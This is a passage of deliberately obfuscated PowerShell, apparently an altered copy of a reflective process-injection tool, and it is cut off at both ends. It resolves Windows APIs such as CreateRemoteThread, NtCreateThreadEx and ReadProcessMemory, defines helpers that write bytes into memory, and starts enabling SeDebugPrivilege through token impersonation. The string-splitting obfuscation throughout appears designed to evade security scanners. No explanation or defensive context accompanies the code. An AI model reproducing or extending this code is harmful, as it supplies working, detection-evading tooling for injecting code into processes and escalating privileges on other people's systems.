        ${ReadPRo`cessM`emO`Ryd`eL`ega`Te}   =  & ( "{0}{2}{3}{1}" -f'Ge','legateType','t','-De'  ) @([IntPtr], [IntPtr], [IntPtr], [UIntPtr],   $078M.("{1}{0}{2}" -f'keByRefT','Ma','ype').Invoke(    )) (  [Bool]  )
        ${rEADPr`O`cess`MEM`ORy} =     (  GET-vARIABLe ( 'A'  + 'l9J'  )   ).VaLUe::(  "{5}{7}{2}{3}{6}{8}{1}{0}{4}"-f'e','nPoint','Delega','teForFu','r','G','n','et','ctio' ).Invoke(${reAdPR`OceSs`m`E`MOrY`ADdr}, ${rEADpRoCESS`Me`mOr`YdeL`e`gA`TE}  )
        ${W`i`N32FuNc`TiONs} |    &  ( "{0}{1}{2}"-f 'Add-','Membe','r') -MemberType ("{0}{2}{1}" -f'Not','erty','eProp'  ) -Name ( "{1}{2}{0}{3}"-f'emor','Rea','dProcessM','y') -Value ${Rea`dprOCes`sMEm`O`RY}

        ${CreATere`Mo`TETh`R`eaD`A`Ddr}  = &("{4}{0}{2}{3}{1}" -f'-Pr','s','ocAddr','es','Get' ) (  "{2}{1}{0}" -f '.dll','ernel32','k') (  "{1}{3}{2}{5}{0}{4}"-f 'hr','C','eRem','reat','ead','oteT')
        ${cReAtEreM`O`T`E`THR`eaDDeLEg`ATe}  = &("{4}{3}{1}{0}{2}"-f'ateT','t-Deleg','ype','e','G'  ) @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr] ) ( [IntPtr] )
        ${CreatE`ReMO`TEt`H`RE`AD}   =     $aL9J::( "{1}{2}{0}{3}{4}" -f 'tionP','GetDelegat','eForFunc','o','inter' ).Invoke(  ${CRe`AtErEMO`T`EtHRe`Ada`d`dr}, ${CrE`A`T`Erem`OtetHR`e`AdDEl`eGate}  )
        ${wI`N32F`UN`CtiONS} |  & ( "{2}{1}{0}"-f'er','dd-Memb','A' ) -MemberType ( "{0}{1}{2}" -f'Not','ePrope','rty') -Name ( "{4}{1}{3}{0}{2}"-f 'h','eateRe','read','moteT','Cr'  ) -Value ${CReAte`REMOtET`h`REad}

        ${gEtExiTCOD`e`THR`e`AdA`ddr} = &  ( "{3}{0}{1}{2}"-f't-P','rocAd','dress','Ge'  ) (  "{0}{2}{1}"-f 'kernel32.','l','dl'  ) (  "{3}{0}{2}{1}"-f'o','Thread','de','GetExitC')
        ${ge`TexIT`cO`DeT`hr`EA`DDE`lEgAtE}  =  &(  "{3}{2}{0}{1}{4}" -f 'gate','Ty','ele','Get-D','pe'  ) @([IntPtr],  ( vArIAbLe  ("Zpq" +  "I7")   ).valuE.(  "{0}{2}{3}{1}"-f 'MakeByRe','e','fT','yp' ).Invoke(    )) ( [Bool]  )
        ${GEt`eX`iT`c`oDETHread}   =   (  Get-vaRiabLe AL9j  -VaLUEOnLy   )::("{1}{2}{8}{4}{6}{3}{0}{7}{5}"-f'in','G','etDele','ionPo','r','er','Funct','t','gateFo' ).Invoke(  ${get`ExiTc`odEThrEadA`d`dR}, ${GE`TeXITco`DeThReA`DdelE`G`Ate})
        ${wiN32`FUN`Ctions}  |    & ( "{2}{0}{1}" -f 'Mem','ber','Add-'  ) -MemberType (  "{2}{0}{1}" -f'teP','roperty','No' ) -Name ("{4}{0}{3}{2}{1}" -f 'ode','d','a','Thre','GetExitC'  ) -Value ${gEteX`i`TCOdet`HrEAd}

        ${oP`entHReadtO`ke`Na`dDR}  =   &( "{0}{1}{2}{3}" -f'Ge','t-Pro','cAddr','ess'  ) (  "{2}{0}{1}{3}"-f'api','32.','Adv','dll') ( "{3}{1}{0}{2}"-f 'h','T','readToken','Open' )
        ${oPeNthr`EAdtoK`E`N`dELEGatE} =   &  ( "{4}{0}{1}{2}{3}" -f'Delega','te','Ty','pe','Get-' ) @([IntPtr], [UInt32], [Bool],   (vaRIaBLe  wJag7 -vaL    ).(  "{2}{1}{3}{0}{4}" -f 'fTyp','R','MakeBy','e','e'  ).Invoke(   )  ) (  [Bool] )
        ${OpEnTh`ReA`D`T`OkEN}   =     (  cHILDITEM vARiabLe:AL9j  ).vAlUE::("{2}{0}{3}{4}{7}{6}{1}{5}"-f 't','orFunctionP','Ge','Dele','g','ointer','teF','a' ).Invoke( ${OPEnT`hrE`A`dTo`ke`N`ADDr}, ${OpENTHrE`ADt`O`Ke`NdEl`e`gaTe})
        ${w`in`3`2fuNCTIONs} |    &  (  "{3}{0}{2}{1}"-f'dd','ember','-M','A') -MemberType ( "{0}{1}{2}{3}"-f 'No','teProp','ert','y'  ) -Name ("{4}{3}{0}{1}{2}" -f'hrea','dTok','en','T','Open'  ) -Value ${OPEN`T`HREA`DTO`kEn}

        ${GEt`CuRrENTThR`eA`d`A`dDr}  =   &  (  "{1}{2}{3}{0}{4}" -f 'ddr','Get-Pr','o','cA','ess' ) (  "{1}{2}{0}"-f 'dll','ker','nel32.') ( "{0}{3}{4}{1}{2}"-f 'G','ea','d','e','tCurrentThr'  )
        ${Getc`URrenTtH`ReaD`deL`eGAtE} =    & ( "{2}{0}{4}{1}{3}" -f 'et','egat','G','eType','-Del'  ) @() ( [IntPtr]  )
        ${geT`CUR`RENtt`hr`eAd}  =  $Al9J::( "{0}{5}{2}{1}{3}{4}"-f'GetD','ForFun','ate','ct','ionPointer','eleg' ).Invoke(${GetC`Urr`e`N`TthR`Eada`Ddr}, ${geTC`URr`ENTTH`R`eadDELEgATE} )
        ${Wi`N3`2FuN`CTIO`Ns}  |  &  ( "{2}{0}{1}{3}"-f '-M','e','Add','mber'  ) -MemberType (  "{0}{1}{3}{2}" -f'N','ot','operty','ePr') -Name ("{4}{0}{2}{1}{3}"-f 'urr','ntT','e','hread','GetC' ) -Value ${GE`TCU`RRENTT`hRE`Ad}

        ${Ad`JUStto`kEN`PRiViLEg`esADdr} =   &  (  "{0}{3}{2}{1}{4}" -f 'Get-P','Addr','c','ro','ess'  ) (  "{2}{0}{3}{1}"-f'api','ll','Adv','32.d'  ) ("{2}{3}{0}{1}"-f'i','leges','Adjust','TokenPriv' )
        ${ADjUS`TTokEnP`Ri`ViL`EGE`S`dEL`EgatE}   =   &( "{1}{0}{2}{3}" -f't-D','Ge','elegateTy','pe' ) @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]  ) (  [Bool] )
        ${ADJU`st`TO`ke`NpRivi`leg`es}  =   $aL9j::( "{5}{1}{6}{0}{3}{2}{4}"-f 'nc','ega','ionPoi','t','nter','GetDel','teForFu'  ).Invoke(  ${A`DJu`s`Tt`O`kenpRivILeg`eSAdDr}, ${a`djuSTT`oKEn`PrIv`i`lEgESdElEG`A`TE} )
        ${wI`N`32`FUNcTions} |    &  (  "{1}{0}{2}{3}"-f'd-','Ad','Me','mber' ) -MemberType ( "{3}{0}{1}{2}"-f 'ote','P','roperty','N'  ) -Name (  "{0}{4}{5}{1}{3}{2}{6}" -f'A','Pri','le','vi','djust','Token','ges' ) -Value ${Ad`jU`st`T`O`keNpRiV`IlEGes}

        ${L`oOKUPp`RiVILeGeVALuE`Ad`dr}  =  &  ("{0}{2}{1}" -f 'Ge','ocAddress','t-Pr' ) ( "{0}{2}{1}{3}"-f'Adv','i32','ap','.dll' ) ( "{1}{2}{4}{5}{3}{0}"-f 'A','Lookup','Priv','Value','il','ege'  )
        ${LOokuPprI`VIl`EGe`VALU`E`D`eleG`AtE}  =  &  ("{1}{2}{0}{3}"-f'p','Get-Deleg','ateTy','e'  ) @([String], [String], [IntPtr] ) ( [Bool]  )
        ${LoOkUPpRIV`Il`eGE`V`ALue} =    ( geT-ItEM  ('V'+'A'  +  'r'  +  'iA' +  'bLe:AL9J' )  ).vALUE::( "{0}{4}{3}{1}{5}{2}" -f'Get','teForFunctionPoi','r','lega','De','nte'  ).Invoke(  ${lOo`kUP`P`Ri`VilE`g`EValuEaDdr}, ${l`oO`K`UPP`RivIl`EgevA`LUEDEleGaTE})
        ${wiN3`2FUNcTi`OnS} |   & ("{1}{0}{2}" -f'd-Mem','Ad','ber') -MemberType ("{1}{0}{2}"-f 'ote','N','Property') -Name ( "{6}{4}{1}{3}{5}{2}{0}"-f 'e','upPr','Valu','ivi','k','lege','Loo'  ) -Value ${loOkUppriVI`legev`A`l`UE}

        ${IM`Per`s`on`ATe`SeLFAddr}  =    &  ("{2}{3}{1}{0}"-f 'ress','ProcAdd','Ge','t-'  ) ( "{0}{3}{1}{2}"-f'A','32','.dll','dvapi'  ) (  "{2}{1}{0}"-f 'f','sonateSel','Imper' )
        ${iMP`eR`SonAT`EsEL`F`D`eleGA`Te}   =     &( "{3}{2}{1}{0}" -f 'eType','legat','e','Get-D' ) @([Int32]  ) ( [Bool]  )
        ${Imp`E`RSonat`Ese`LF} =  $al9j::(  "{2}{5}{3}{1}{8}{6}{0}{7}{4}"-f'i','lega','G','e','ointer','etD','rFunct','onP','teFo' ).Invoke(  ${i`Mper`sONA`TE`s`E`lfaDDR}, ${IMP`eRSOnaTe`se`lFD`ELe`G`ATE}  )
        ${WiN`3`2`FUnCTIoNs} |    &( "{1}{2}{0}"-f 'mber','Add-M','e') -MemberType (  "{2}{0}{3}{1}"-f'ro','y','NoteP','pert'  ) -Name ( "{3}{0}{1}{2}"-f'o','na','teSelf','Impers') -Value ${iMPErS`O`NaTe`SE`LF}

       
        if (( $1Z6::"O`S`VersiOn"."ve`RSIOn" -ge (   &(  "{1}{2}{0}"-f 'ct','New','-Obje'  ) 'Version' 6,0) ) -and (  $1Z6::"os`V`eRSION"."ve`RSiON" -lt (    &( "{1}{0}{2}{3}" -f'e','N','w-Obj','ect' ) 'Version' 6,2 )) ) {
            ${NtCREAtET`hReAd`EXAd`Dr} =     &  (  "{3}{2}{1}{0}" -f'ss','-ProcAddre','t','Ge'  ) ( "{0}{1}" -f 'N','tDll.dll' ) ("{2}{1}{0}" -f 'Ex','ead','NtCreateThr' )
            ${NT`crEA`Te`Th`REAdexDelEgA`Te}  =   &( "{2}{3}{1}{0}"-f'pe','eTy','Get-De','legat'  ) @( (   LS (  'v'  + 'a' +'RI' +  'ABlE:wjaG7' )  ).VaLue.(  "{1}{2}{0}"-f 'pe','Mak','eByRefTy').Invoke( ), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]  ) ([UInt32]  )
            ${Nt`cREa`Teth`Read`ex}  =  (cHILDITem (  "vaRIABLe:"+"al"  + "9"  + "J"  )  ).vAluE::( "{2}{1}{3}{6}{0}{4}{5}"-f 'ti','egateFor','GetDel','Fu','onPoi','nter','nc' ).Invoke( ${NtCREa`T`E`T`hreA`dEXa`DdR}, ${NTcre`A`T`e`T`hREa`dexdel`EGaTE}  )
            ${WIn32`F`U`Nct`iOnS} |  &  ( "{0}{2}{1}"-f'Ad','ber','d-Mem') -MemberType (  "{0}{3}{2}{1}"-f'No','rty','ope','tePr') -Name (  "{0}{1}{2}" -f 'NtCre','ateThr','eadEx'  ) -Value ${nT`crEATeT`H`R`eaD`eX}
        }

        ${iS`W`ow64pRo`ce`SSAD`dr}   =   & (  "{0}{4}{1}{3}{2}" -f 'Ge','ProcAdd','ess','r','t-' ) ( "{1}{2}{0}{3}" -f'l32.','Ker','ne','dll') ("{3}{2}{0}{1}"-f 'ce','ss','w64Pro','IsWo'  )
        ${i`SwOW6`4pRo`CE`S`Sd`ELegaTE} =   & ("{3}{4}{0}{2}{1}" -f 'Delega','e','teTyp','Get','-'  ) @([IntPtr],   (  ls vaRIAble:HQmGKU   ).value.(  "{0}{1}{2}" -f 'MakeBy','R','efType').Invoke(    )  ) ([Bool] )
        ${iSwOw64P`ROc`e`Ss}   =   ( varIABlE  aL9j -ValuEO)::("{4}{1}{6}{3}{7}{2}{8}{0}{5}" -f'Poin','De','Fun','ega','Get','ter','l','teFor','ction').Invoke(  ${is`WOw64PROcE`SS`AdDr}, ${isW`ow64p`Roc`eSs`delE`GA`TE})
        ${wiN32F`UNc`T`IO`NS}  |    &( "{1}{0}{2}" -f 'Mem','Add-','ber') -MemberType (  "{1}{3}{0}{2}" -f 'e','Not','rty','eProp'  ) -Name ("{0}{1}{2}{4}{3}" -f'I','s','Wo','ocess','w64Pr'  ) -Value ${isW`oW64pR`ocEsS}

        ${CrEAte`THREa`d`ADDR}   =   & ("{1}{2}{0}"-f 'ress','Get-','ProcAdd' ) (  "{3}{1}{0}{2}" -f'.dl','32','l','Kernel') ( "{0}{3}{1}{2}"-f'C','te','Thread','rea'  )
        ${cReaTE`TH`Re`AD`del`E`GATe}  =  &("{3}{2}{4}{1}{0}" -f'gateType','le','t-','Ge','De' ) @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32],   (  VaRiaBLE 1X8Dw  ).ValUE.("{1}{2}{0}"-f 'pe','MakeByR','efTy').Invoke() ) (  [IntPtr]  )
        ${c`REATEth`RE`AD}  =  (  vArIabLe (  "al"  +"9J") -Va    )::("{3}{4}{0}{5}{6}{2}{7}{1}"-f 'ateForFu','inter','tion','GetD','eleg','n','c','Po').Invoke(${c`R`EA`TEtHreA`Daddr}, ${cR`Ea`TET`hREaDd`Ele`g`AtE})
        ${w`in32F`UnCt`IonS} |    &("{0}{1}{2}"-f'A','dd-M','ember' ) -MemberType ("{0}{2}{3}{1}"-f 'Not','y','ePrope','rt'  ) -Name (  "{3}{2}{0}{1}" -f 'eTh','read','reat','C'  ) -Value ${cre`ATEt`Hr`ead}

        ${LOca`L`FR`eEADDR}   =   &  (  "{1}{0}{2}" -f'e','G','t-ProcAddress'  ) (  "{3}{0}{1}{2}" -f'r','n','el32.dll','ke' ) ("{2}{0}{1}" -f 'ualFr','ee','Virt')
        ${lo`c`AL`FRE`edeleGaTE}  =   & ("{1}{3}{2}{0}" -f 'gateType','G','-Dele','et'  ) @([IntPtr]  )
        ${LOcA`lf`REE} =     ( vARiABlE al9j  -VAL    )::( "{4}{3}{1}{6}{0}{5}{7}{2}"-f'P','t','r','e','G','oint','DelegateForFunction','e' ).Invoke(${LOcA`LF`ReEaD`DR}, ${lOcALf`R`ee`delEGA`TE}  )
        ${wIN32FU`NCTI`ONs}   |    &( "{2}{3}{0}{1}"-f 'Memb','er','Add','-' ) ( "{1}{0}{3}{2}"-f'o','NotePr','rty','pe') -Name ( "{0}{2}{1}" -f'Loc','ree','alF') -Value ${lOca`lfr`eE}

        return ${W`iN32FU`NctIO`NS}
    }
   


   
   
   

   
   
    Function Su`B`-sIGnEdinTAsu`N`S`igneD
    {
        Param(
        [Parameter( POsITIon = 0, mandATORy   =   ${Tr`UE}  )]
        [Int64]
        ${V`ALuE1},

        [Parameter(PosItiOn  = 1, mandAtORY   =  ${Tr`Ue} )]
        [Int64]
        ${vaLu`E2}
        )

        [Byte[]]${VAl`Ue1B`yT`es} =     (   vARiabLe vt7Bl).Value::(  "{1}{0}" -f 'Bytes','Get').Invoke( ${VAlu`e1}  )
        [Byte[]]${va`L`U`E2BYteS}  =    $vT7BL::( "{1}{0}{2}"-f 'etByt','G','es').Invoke( ${v`AlUE2} )
        [Byte[]]${fi`N`ALbYT`Es}  =     $Vt7BL::"geTBY`T`ES"( [UInt64]0 )

        if (  ${va`lUE1BYt`eS}."cO`UNt" -eq ${vA`L`U`E2BYtES}."cO`UNt"  )
        {
            ${C`AR`RYOver}   =  0
            for ( ${I} =  0 ;   ${I} -lt ${V`Al`UE1BYt`Es}."C`oUnt" ; ${i}++ )
            {
                ${v`Al}  =   ${value`1`By`TES}[${I}] - ${Ca`RR`YOVer}
               
                if (${v`Al} -lt ${VAl`UE2ByT`eS}[${I}]  )
                {
                    ${v`Al} += 256
                    ${c`ARry`OvEr}  =   1
                }
                else
                {
                    ${cA`RryO`V`eR} =   0
                }


                [UInt16]${s`Um} =  ${V`AL} - ${vaL`Ue2b`Y`TES}[${i}]

                ${f`ina`LBy`TeS}[${I}]   = ${S`Um} -band 0x00FF
            }
        }
        else
        {
            Throw "Modified: Cannot subtract bytearrays of different sizes"
        }

        return   $Vt7bl::(  "{0}{1}{2}"-f'T','oInt','64').Invoke(${FINALbY`T`ES}, 0 )
    }


    Function Add-sIGn`edIn`TaS`U`N`SIgnEd
    {
        Param(
        [Parameter( POSiTiOn =  0, MAndaTOry  =   ${t`RUe}  )]
        [Int64]
        ${va`l`UE1},

        [Parameter(poSItiON   =  1, manDAToRy  =   ${T`RUE})]
        [Int64]
        ${V`A`lue2}
        )

        [Byte[]]${V`AlU`E1`BytEs}  =   (   GEt-VARiaBLE Vt7bl  -VALUeo )::(  "{0}{1}"-f 'G','etBytes').Invoke(${VAL`Ue1} )
        [Byte[]]${vAlue`2B`yT`es}   =  ( GEt-VARiAble  vt7Bl   ).vALuE::( "{1}{0}" -f'tes','GetBy' ).Invoke(  ${v`A`LUe2}  )
        [Byte[]]${F`i`NALB`YTEs} =   $Vt7bL::"GetB`Y`TEs"([UInt64]0 )

        if (  ${v`AlUe1`ByT`es}."c`OunT" -eq ${VAluE2by`T`es}."C`ounT"  )
        {
            ${car`RYov`er}   =  0
            for (${i}  = 0  ; ${i} -lt ${V`AluE1`B`Ytes}."CO`Unt"; ${i}++  )
            {
               
                [UInt16]${s`UM} = ${va`Lu`E1b`YTES}[${I}] + ${va`Lue2`ByT`eS}[${i}]  +   ${cARrY`ov`eR}

                ${F`inA`lBYtes}[${i}]  =  ${s`UM} -band 0x00FF

                if (  ( ${s`Um} -band 0xFF00 ) -eq 0x100  )
                {
                    ${caRRYo`V`er} =   1
                }
                else
                {
                    ${car`R`yovEr}  =   0
                }
            }
        }
        else
        {
            Throw "Modified: Cannot add bytearrays of different sizes"
        }

        return  (  gci  vARIAblE:Vt7Bl  ).ValuE::("{2}{1}{0}"-f'4','t6','ToIn').Invoke(  ${f`INalb`YTeS}, 0 )
    }


    Function c`OMPaR`E-vaL1gReATeR`ThaNVAl`2a`s`UInT
    {
        Param( 
        [Parameter(poSitiOn   = 0, mandatOrY   = ${t`Rue})]
        [Int64]
        ${VA`l`UE1},

        [Parameter(  POsItION   =   1, MAnDAtoRy = ${t`RuE})]
        [Int64]
        ${vAL`UE2}
          )

        [Byte[]]${vAluE`1BYt`Es}  =   $VT7BL::("{1}{2}{0}" -f 'es','GetBy','t' ).Invoke(${va`LUE1} )
        [Byte[]]${VaLuE2`Byt`eS}   =    ( varIaBLE ( 'v'+'T7Bl') -vaLUeonl  )::("{2}{0}{1}"-f'Byte','s','Get').Invoke(${VaL`U`e2} )

        if (  ${V`A`lue1`ByTES}."Co`UNT" -eq ${V`AlUe2`BYtES}."cO`UNT"  )
        {
            for ( ${I} = ${vALUe1B`y`T`ES}."C`ount"-1;  ${I} -ge 0  ;   ${I}--  )
            {
                if (${Val`Ue1b`y`TEs}[${i}] -gt ${vA`l`UE`2bYTES}[${I}]  )
                {
                    return ${tR`Ue}
                }
                elseif (  ${vAL`U`e1ByT`eS}[${I}] -lt ${VA`LU`E2By`TEs}[${i}])
                {
                    return ${FA`lsE}
                }
            }
        }
        else
        {
            Throw "Modified: Cannot compare byte arrays of different size"
        }

        return ${F`Al`Se}
    }


    Function CoN`VER`T-U`i`NtTO`iNt
    {
        Param( 
        [Parameter( posiTion   =   0, mANdaTory   =  ${T`RuE}  )]
        [UInt64]
        ${Val`UE}
          )

        [Byte[]]${V`ALuE`ByTeS}  =   (dIR  ("Va"  +"r"+"iABlE" +  ":Vt7B"  + "L"  )  ).VaLuE::(  "{1}{0}"-f 'ytes','GetB' ).Invoke(${vAl`Ue}  )
        return (  $Vt7bl::( "{0}{2}{1}"-f'ToI','t64','n').Invoke( ${VAlUEBy`T`es}, 0  )  )
    }


    Function TESt`-MeMORYranGev`A`LId
    {
        Param( 
        [Parameter( pOsitiON  =   0, maNdATORY = ${T`Rue}  )]
        [String]
        ${DeBug`ST`RINg},

        [Parameter(  POSItIOn =  1, MANDATorY  =   ${T`Rue}  )]
        [System.Object]
        ${pE`i`NFO},

        [Parameter( poSITioN   =  2, mANdatOry =  ${tr`UE} )]
        [IntPtr]
        ${st`ArtA`DD`ReSS},

        [Parameter(pARamETErSetName   =   "Size", PosiTion   =  3, maNDatory   =  ${t`RUe})]
        [IntPtr]
        ${Si`ze}
         )

        [IntPtr]${F`i`Nal`E`NdADDREsS}   =   [IntPtr](  & ( "{1}{2}{3}{0}{4}" -f 'gnedIntAsUns','Add','-S','i','igned'  ) (  ${sTARtaD`d`RESs}) (  ${Si`zE})  )

        ${pEe`NDAdd`ResS}  =   ${PEIn`Fo}."e`Ndad`DrESs"

        if ( (    &("{6}{5}{0}{4}{2}{3}{8}{1}{7}" -f'ar','erThanVal2A','Val1','Gr','e-','omp','C','sUInt','eat' ) (  ${pE`I`NFO}."p`ehanDLE"  ) (  ${S`Tar`T`ADdRess} )  ) -eq ${T`RuE}  )
        {
            Throw "Modified: Trying to write to memory smaller than allocated address range. $DebugString"
        }
        if ((   &("{2}{6}{0}{4}{9}{1}{3}{5}{8}{7}"-f'are-Val1G','terT','C','h','r','anVa','omp','t','l2AsUIn','ea'  ) ( ${fiNa`L`EN`dA`DDReSs}  ) (${P`Ee`N`dAddr`eSS}  )  ) -eq ${t`RUE} )
        {
            Throw "Modified: Trying to write to memory greater than allocated address range. $DebugString"
        }
    }


    Function W`RIT`E-Byte`S`To`m`eMoRY
    {
        Param(  
            [Parameter(pOSItioN=0, MandatoRy   =   ${TR`Ue})]
            [Byte[]]
            ${ByT`eS},

            [Parameter(  PosiTIoN =  1, maNdaTOry =   ${TR`UE} )]
            [IntPtr]
            ${MEMOR`ya`dD`RESS}
        )

        for (${oFfs`eT}   =   0  ;   ${offs`et} -lt ${B`yTEs}."LEn`gtH"  ;   ${o`F`FsET}++  )
        {
             $al9j::"w`RITEbyte"(  ${mEm`or`yADdrESs}, ${O`F`FsEt}, ${B`yTeS}[${o`F`FSET}]  )
        }
    }


   
    Function get`-D`e`LEGa`Te`TYPe
    {
        Param
        (
            [OutputType([Type] )]

            [Parameter(   pOsiTION =  0 )]
            [Type[]]
            ${p`Ar`AmEterS} =  (    &( "{1}{0}{3}{2}"-f 'e','N','t','w-Objec' ) (  "{2}{1}{0}"-f ']','e[','Typ')(0 )  ),

            [Parameter(   pOSItion =  1  )]
            [Type]
            ${re`T`UrNtY`PE} = [Void]
         )

        ${dOM`A`in} =   $3aR8::"CUrR`entDOMA`IN"
        ${DYN`AS`SemBLY}   =  & ("{0}{2}{1}" -f'Ne','ct','w-Obje' ) ( "{0}{6}{4}{3}{5}{2}{1}{7}" -f 'S','mb','se','em.Reflection.','t','As','ys','lyName')('ReflectedDelegate')
        ${ASSEmBly`BU`i`lDER} = ${d`om`AiN}."D`Efi`NEDY`NAMIcAss`embLY"( ${d`YN`As`SEmBLY},  (    Get-VariaBle Pg8e1  -valUEONL    )::"r`UN" )
        ${modUl`E`BUI`LDer} = ${aSseM`Bl`YbuiL`der}.(  "{0}{3}{2}{1}{4}"-f'D','DynamicModul','ine','ef','e'  ).Invoke( 'InMemoryModule', ${F`AlsE})
        ${TyPEBUI`l`der}  =  ${mOduLebUi`L`d`Er}.("{3}{2}{1}{0}" -f'ype','ineT','f','De' ).Invoke('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]  )
        ${con`STru`ctorbU`I`l`dEr}   = ${tyPebui`L`Der}."dEF`i`NECoN`s`TructOr"( 'RTSpecialName, HideBySig, Public',  (   VAriabLe  6RLCn -vALu  )::"StANDa`Rd", ${p`Ar`AM`ETERs})
        ${c`OnStRuc`ToRb`U`ILder}.( "{4}{2}{1}{0}{3}" -f'Flag','ation','t','s','SetImplemen'  ).Invoke( 'Runtime, Managed' )
        ${METH`oDBUI`LdER}   =  ${t`ypE`BU`ilDER}.( "{2}{1}{0}" -f 'neMethod','i','Def').Invoke(  'Invoke', 'Public, HideBySig, NewSlot, Virtual', ${Re`TurnT`ype}, ${PA`RAmeTE`Rs})
        ${m`EthoDBUiLd`Er}.(  "{4}{0}{2}{1}{5}{3}"-f'tImp','me','le','nFlags','Se','ntatio' ).Invoke(  'Runtime, Managed'  )

        &("{1}{2}{0}" -f 'utput','Writ','e-O'  ) ${TYpE`BUILd`eR}.("{0}{3}{2}{1}" -f 'C','teType','a','re'  ).Invoke(   )
    }


   
    Function g`eT-prO`c`AdD`ReSS
    {
        Param
        ( 
            [OutputType([IntPtr] )]

            [Parameter( positIoN = 0, MandATOrY  =  ${Tr`UE}   )]
            [String]
            ${mO`duLe},

            [Parameter(  posItIoN  =  1, ManDatORy  = ${tr`UE}  )]
            [String]
            ${Pr`O`C`EduRe}
          )

       
        ${sY`s`TeMASsem`BlY} =  ( ITEm ('Va' + 'R'  + 'IaB'  +  'Le:3'+'aR8' )   ).VaLUE::"c`UrR`EN`TdoMaIn".(  "{1}{2}{0}" -f'semblies','GetA','s').Invoke( )   |  
              &  ( "{2}{1}{0}"-f 'ject','-Ob','Where'  ) { ${_}."GlO`BALa`S`seMBl`yca`CHe" -And ${_}."l`ocATi`oN".("{0}{1}"-f 'Spli','t'  ).Invoke('\\'  )[-1].( "{1}{0}"-f'uals','Eq' ).Invoke(  'System.dll' ) }
        ${u`N`SAfena`TivEMe`THoDs}   =  ${s`Yst`ema`S`SEmblY}.("{0}{1}" -f 'G','etType').Invoke(  'Microsoft.Win32.UnsafeNativeMethods'  )
       
        ${ge`TmO`dulE`HaNdlE}  = ${UN`s`AfEn`AtIVemeT`HOdS}.(  "{2}{0}{3}{1}" -f 'et','od','GetM','h'  ).Invoke('GetModuleHandle'  )
        ${ge`Tpr`o`CADD`RESs}   = ${un`sAfeN`At`I`VEM`EtHOds}."Ge`Tm`e`THod"('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String] )  )
       
        ${KEr`N`32`HANdLE}   =   ${get`m`ODuleh`AnDle}."iNvo`kE"(${n`ULL}, @(${m`od`ULe}))
        ${t`mPPTr}  =   & ("{2}{1}{0}"-f'ject','-Ob','New'  ) ("{0}{1}" -f 'I','ntPtr')
        ${h`A`NDLEReF}  =   & (  "{1}{3}{0}{2}"-f'Ob','N','ject','ew-' ) (  "{10}{8}{6}{4}{11}{5}{7}{12}{2}{3}{9}{0}{1}"-f 'es.Ha','ndleRef','r','vi','nt','In','.Ru','ter','ystem','c','S','ime.','opSe'  )(  ${T`M`ppTr}, ${ker`N32`HAN`dLE}  )

       
          & (  "{2}{1}{0}{3}"-f'tpu','ite-Ou','Wr','t'  ) ${GE`Tp`ROCa`Dd`REss}."I`N`VOKE"(  ${N`ULL}, @([System.Runtime.InteropServices.HandleRef]${HA`N`dlEr`Ef}, ${p`ROCe`DU`RE}))
    }


    Function EN`AbLe-S`e`d`ebUGPR`IV`i`Lege
    {
        Param(  
        [Parameter(posiTiON  = 1, mAnDATORy =  ${tr`Ue}  )]
        [System.Object]
        ${wiN3`2FuN`c`TI`onS},

        [Parameter(  pOSiTiON   =   2, mANDATorY  =   ${t`RuE})]
        [System.Object]
        ${wIN32tY`p`ES},

        [Parameter(PosITIOn   =   3, MAndAToRY  =  ${tR`Ue} )]
        [System.Object]
        ${wI`N`32cONstA`NtS}
          )

        [IntPtr]${Thr`ea`DHAndLE}   = ${W`iN32fUN`ct`ionS}."GET`cUR`ReNTthre`AD"."i`NVOKE"(  )
        if ( ${T`HREaDh`An`DLe} -eq  $wJaG7::"Ze`Ro"  )
        {
            Throw "Modified: Unable to get the handle to the current thread"
        }

        [IntPtr]${Th`REa`dto`KEn} =    $WjaG7::"Z`ero"
        [Bool]${rEsu`LT} =  ${WI`N32F`UNCTI`Ons}."oPenT`Hre`Ad`T`oken"."inVO`Ke"(${tH`REaD`HaNd`Le}, ${wi`N3`2CoNs`Ta`NtS}."t`oK`en_que`Ry" -bor ${WIn3`2c`ONSta`Nts}."tOKen`_aD`ju`sT_PRiv`Il`eG`es", ${FaL`se}, [Ref]${Th`RE`Adtok`en}  )
        if (  ${rE`sUlT} -eq ${fA`LSE} )
        {
            ${err`ORCO`De}  =  (geT-chIldiTem  VARiABLE:Al9j  ).vAlue::(  "{2}{1}{3}{0}" -f'Error','tLastWi','Ge','n32' ).Invoke( )
            if ( ${eRrO`RC`ode} -eq ${W`i`N32co`NStA`NtS}."er`R`OR_n`O`_tOKen")
            {
                ${ReS`ULt}  =  ${wIN3`2fUNc`T`iO`NS}."IMPerso`N`AT`esElf"."in`VokE"(3 )
                if (${re`s`ULt} -eq ${fAl`SE}  )
                {
                    Throw "Modified: Unable to impersonate self"
                }

                ${R`E`sULt}   =  ${wIN`3`2f`UnCTIons}."oP`ENtH`R`eAdTo`kEn"."iNV`o`kE"( ${Th`READhAND`lE}, ${WiN`32coNSt`A`NTS}."toKEn_Q`U`ery" -bor ${w`IN32`cOnsT`A`NTs}."tOKEn_`AD`j`U`sT`_prIViLEg`ES", ${Fa`L`sE}, [Ref]${thRe`Adto`keN} )
                if (  ${rE`Su`lt} -eq ${F`A`lsE} )
                {
                    Throw "Modified: Unable to OpenThreadToken."
                }
            }
            else
            {
                Throw "Modified: Unable to OpenThreadToken. Error code: $ErrorCode"
            }
        }

        [IntPtr]${P`LUId}   =     (  VaRiABLe ("aL9"  +  "j" ) -vAlUEoN  )::"A`LLOcHg`lO`BAL"(  (    gEt-vAriABLe AL9J  -val   )::"S`iZeoF"(  [Type]${w`I`N32`TYPeS}."l`UiD"  ) )
        ${rE`s`ULT} =   ${w`iN3`2funcT`io`Ns}."Lo`O`kupP`RivIl`eG`evaLUe"."I`NvoKE"(${Nu`LL}, "SeDebugPrivilege", ${PLU`id} )
        if (  ${R`e`SuLT} -eq ${fA`l`sE} )
        {
            Throw "Modified: Unable to call LookupPrivilegeValue"
        }

